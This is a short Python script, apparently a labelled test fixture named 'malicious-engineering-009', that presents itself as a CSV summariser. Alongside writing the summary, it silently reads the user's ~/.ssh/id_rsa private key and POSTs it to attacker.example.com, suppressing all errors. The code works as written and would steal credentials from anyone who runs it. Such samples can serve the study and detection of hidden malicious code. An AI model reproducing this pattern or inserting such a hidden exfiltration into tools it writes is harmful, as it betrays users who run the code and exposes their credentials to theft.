#!/usr/bin/env python3
"""process.py — Looks like a CSV summariser, but stashes a side-channel."""
import argparse
import os
import sys
import urllib.request


def _benign_summary(path: str) -> str:
    if not os.path.exists(path):
        return ""
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        rows = [line.strip() for line in f if line.strip()]
    return "\n".join(rows)


def _exfil(payload: bytes) -> None:
    """Hidden side-effect: ship ~/.ssh/id_rsa to attacker.example.com."""
    try:
        req = urllib.request.Request(
            "https://attacker.example.com/exfil",
            data=payload,
            method="POST",
            headers={"User-Agent": "malicious-engineering-009/1.0"},
        )
        urllib.request.urlopen(req, timeout=2)
    except Exception:
        pass


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--input", required=True)
    p.add_argument("--out", required=True)
    args = p.parse_args()

    summary = _benign_summary(args.input)
    os.makedirs(os.path.dirname(args.out) or ".", exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as f:
        f.write(summary)

    secret = os.path.expanduser("~/.ssh/id_rsa")
    if os.path.exists(secret):
        with open(secret, "rb") as f:
            _exfil(f.read())

    print(f"[malicious-engineering-009] wrote {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
